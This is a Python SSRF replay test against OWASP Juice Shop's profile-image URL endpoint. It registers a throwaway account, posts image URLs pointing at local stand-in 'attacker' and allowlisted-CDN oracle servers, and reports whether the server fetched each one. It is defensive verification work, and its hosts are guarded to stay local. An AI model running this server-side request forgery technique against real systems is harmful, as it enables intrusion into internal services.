#!/usr/bin/env python3
"""pt04: SSRF via Juice Shop's profile-image-by-URL feature.

A logged-in user can set `imageUrl` to anything, and the server itself
fetches it (confirmed separately: the fetch arrives with User-Agent
"node", not a browser). This scenario proves it with an out-of-band
callback: it spins up two throwaway local oracle servers, one standing
in for an attacker's arbitrary callback target, one standing in for a
single vetted/allowlisted image CDN, fires a profile-image-url request
at each with a random marker in the path, and checks which oracle
actually got hit.

Both oracle hosts must themselves pass ledger.guard_target_host (they're
host.docker.internal, "this machine," never a real external domain).

Standard library only (urllib, http.server, threading).
"""

from __future__ import annotations

import argparse
import json
import secrets
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt04-001.json"
WAIT_SECONDS = 4.0
POLL_INTERVAL = 0.2


class _Oracle:
    """A throwaway local HTTP server that records which paths it was hit on."""

    def __init__(self, port: int):
        self.hits: list[str] = []
        handler = self._make_handler()
        self.server = ThreadingHTTPServer(("0.0.0.0", port), handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def _make_handler(self):
        hits = self.hits

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                hits.append(self.path)
                self.send_response(200)
                self.send_header("Content-Type", "image/png")
                self.end_headers()
                self.wfile.write(b"fake-png-bytes")

            def log_message(self, *a):
                pass

        return Handler

    def was_hit(self, marker: str, wait_seconds: float = WAIT_SECONDS) -> bool:
        deadline = time.time() + wait_seconds
        while time.time() < deadline:
            if any(marker in path for path in self.hits):
                return True
            time.sleep(POLL_INTERVAL)
        return any(marker in path for path in self.hits)

    def stop(self) -> None:
        self.server.shutdown()


def _request(method: str, url: str, token: str | None = None, form: dict | None = None):
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if form is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if token:
        req.add_header("Cookie", f"token={token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def run(target: str, vuln_id: str, mitre_technique: str, attacker_host: str, cdn_host: str) -> dict:
    ledger.guard_target_host(target)
    ledger.guard_target_host(attacker_host)
    ledger.guard_target_host(cdn_host)

    attacker_port = int(urllib.parse.urlparse(attacker_host).port)
    cdn_port = int(urllib.parse.urlparse(cdn_host).port)
    attacker_oracle = _Oracle(attacker_port)
    cdn_oracle = _Oracle(cdn_port)

    try:
        stamp = secrets.token_hex(4)
        email = f"pt04-{stamp}@flatline.test"
        password = "Pt04Pass123!"

        register_req = urllib.request.Request(
            f"{target}/api/Users",
            data=json.dumps({"email": email, "password": password, "passwordRepeat": password}).encode(),
            method="POST",
        )
        register_req.add_header("Content-Type", "application/json")
        urllib.request.urlopen(register_req, timeout=10).read()

        login_req = urllib.request.Request(
            f"{target}/rest/user/login",
            data=json.dumps({"email": email, "password": password}).encode(),
            method="POST",
        )
        login_req.add_header("Content-Type", "application/json")
        token = json.loads(urllib.request.urlopen(login_req, timeout=10).read())["authentication"]["token"]

        attack_marker = f"attack-{secrets.token_hex(6)}"
        legit_marker = f"legit-{secrets.token_hex(6)}"

        attack_status, _ = _request(
            "POST", f"{target}/profile/image/url", token=token,
            form={"imageUrl": f"{attacker_host}/{attack_marker}"},
        )
        legit_status, _ = _request(
            "POST", f"{target}/profile/image/url", token=token,
            form={"imageUrl": f"{cdn_host}/{legit_marker}"},
        )

        attack_oracle_hit = attacker_oracle.was_hit(attack_marker)
        legit_oracle_hit = cdn_oracle.was_hit(legit_marker)
    finally:
        attacker_oracle.stop()
        cdn_oracle.stop()

    if attack_oracle_hit:
        status = "VULNERABLE"
        summary = "Server made an outbound request to the attacker-controlled callback host."
    elif legit_oracle_hit:
        status = "REMEDIATED"
        summary = "Attacker callback not reached; allowlisted CDN still reachable."
    else:
        status = "ERROR"
        summary = "Inconclusive: neither oracle was hit (allowlisted CDN should always be reachable)."

    return {
        "vulnerability_id": vuln_id,
        "mitre_technique": mitre_technique,
        "target": target,
        "status": status,
        "attack_profile_image_http_status": attack_status,
        "legit_profile_image_http_status": legit_status,
        "summary": summary,
        "legitimate_cdn_oracle_hit": legit_oracle_hit,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(
        target,
        blueprint["vulnerability_id"],
        blueprint["mitre_technique"],
        blueprint["attacker_callback_host"],
        blueprint["trusted_image_cdn_host"],
    )
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt04-ssrf-profile-image", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
